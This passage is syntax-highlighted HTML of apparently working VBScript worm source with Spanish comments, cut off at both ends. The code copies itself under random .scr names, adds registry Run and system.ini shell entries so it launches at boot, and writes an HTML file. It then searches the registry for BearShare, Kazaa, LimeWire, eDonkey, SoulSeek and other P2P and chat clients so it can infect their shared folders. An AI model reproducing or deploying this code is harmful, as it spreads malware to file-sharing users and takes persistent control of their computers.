</span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">SA</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Rn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc1">'activamos la copia con nombre aleatorio
</span><span class="sc7">Cw.Run</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Rn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc0">

</span><span class="sc1">'escribimos en el registro y en el system.ini para ejecutarnos
'al inicio de la pc
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\W32Load"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Rn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".scr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">WIni</span><span class="sc0"> </span><span class="sc4">"boot"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"shell"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Explorer.exe "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\Capside.exe"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\System.ini"</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Latencia</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc1">'creamos CapsideCode.htm
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.CreateTextFile</span><span class="sc6">(</span><span class="sc7">Sp</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\CapsideCode.htm"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">c.write</span><span class="sc0"> </span><span class="sc7">CodeScript1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">CodeScript2</span><span class="sc0">
</span><span class="sc7">c.Close</span><span class="sc0">

</span><span class="sc1">'llamamos a los procedimientos
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">Vfirmas</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">VP2P</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">VDisk</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para verificar la existencia de programas p2p
'instalados en la pc, de encontralos activa el procedimiento
'correspondiente
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VP2P</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\SOFTWARE\BearShare\InstallDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VBear</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\SOFTWARE\KAZAA\CloudLoad\ExeDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VKazaa</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\SOFTWARE\mscrp\morpheushome"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VMorpheus</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Mirabilis\ICQ\Install\General\InstalledDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VIcq</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\CLASSES\ed2k\DefaultIcon\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VEdonkey</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CLASSES_ROOT\ftopia\shell\open\command\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VFiletopia</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Grokster\UninstallString"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VGrokster</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\iMesh\Client\ProgramLocation"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VImesh</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\LimeWire\InstallDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VLimewire</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Software\FileNavigator_26\DownloadDirectory"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VSwaptor</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Gnucleus\UninstallString"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VGnucleus</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Overnet\UninstallString"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VOverNet</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Software\SoulSeek\InstallPath"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">VSoulSeek</span><span class="sc0"> </span><span class="sc7">IsD</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Imesh
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VImesh</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Rg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\iMesh\Client\LocalContent\"</span><span class="sc0">
</span><span class="sc7">Rg0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc7">Rg</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Dir0"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc7">Rg</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Dir0"</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Rg1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc7">Rg</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Dir1"</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc7">Rg</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Dir1"</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Rg0</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Rg1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Limewire
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VLimewire</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Cf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.filesystemobject"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Lp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Cf.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\.limewire\limewire.props"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Lp.AtendOfStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">Ll</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Lp.Readline</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DIRECTORIES_TO_SEARCH_FOR_FILES="</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Ln</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"="</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Ll</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Ln</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Ll</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Ll</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\:"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">":\"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Ll</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">";"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Ll</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Lm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">Ll</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">";"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Lm</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Lm</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Lp.Close</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub paraobtener la ruta del folder compartido de BearShare
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VBear</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\db\library.dat"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">l.AtendOfStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">J</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">l.Readline</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">l.Close</span><span class="sc0">
</span><span class="sc7">Jb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">J</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">J</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">n2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">J</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)):</span><span class="sc0"> </span><span class="sc7">J</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">J</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">n2</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Jm</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">J</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">15</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Jm</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">J0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Jm</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">J1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Jm</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Jm</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Jm</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Jm</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">n3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">J1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">9</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">n3</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">J1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">J1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">n3</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">J0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">J0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">J0</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">J1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">J1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">J1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">Jb</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Jb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">b1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">Jb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)):</span><span class="sc0"> </span><span class="sc7">J0</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Jb</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">b1</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
